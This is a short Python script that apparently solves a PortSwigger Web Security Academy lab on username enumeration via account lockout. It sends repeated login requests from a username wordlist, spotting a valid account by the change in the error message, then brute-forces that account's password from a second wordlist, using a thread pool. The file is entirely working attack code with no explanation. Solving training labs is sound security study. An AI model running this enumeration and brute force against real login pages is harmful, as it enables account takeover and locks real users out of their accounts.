#!/usr/bin/python

import time
from multiprocessing import Pool

import requests

# https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock

URL = "https://ac191fa81f27b1de80194907001900cc.web-security-academy.net/login"

threads = []


def is_valid_payload(params):
    for _ in range(4):
        res = requests.post(URL, data=params)
        time.sleep(1)

    res = requests.post(URL, data=params)
    if res.text.find("Invalid username or password.") == -1:
        print("username is ", params["username"])
        return True


def brute_usernames(pool):
    with open("usernames") as usernames:
        while True:
            line = usernames.readline()
            line = line[:-1]
            if not line:
                break
            params = {"username": line, "password": "sadfasdf"}
            r = pool.apply_async(is_valid_payload, (params, ))
            threads.append(r)
            #  r.get()


def is_valid_pass(params):
    res = requests.post(URL, data=params)
    if res.text.find("Invalid username or password.") == -1 and res.text.find(
            "You have made too many incorrect login attempts") == -1:
        print("password is ", params["password"])
        return True


def brute_passwords(pool):
    with open("passwords") as passwords:
        while True:
            line = passwords.readline()
            line = line[:-1]
            if not line:
                break
            params = {
                "username": "alerts",
                "password": line,
            }
            if is_valid_pass(params):
                break
            #  threads.append(r)
            #  r = pool.apply_async(is_valid_pass, (params, ))
            #  break


pool = Pool(5)
brute_usernames(pool)
#  brute_passwords(pool)
for thread in threads:
    thread.get()
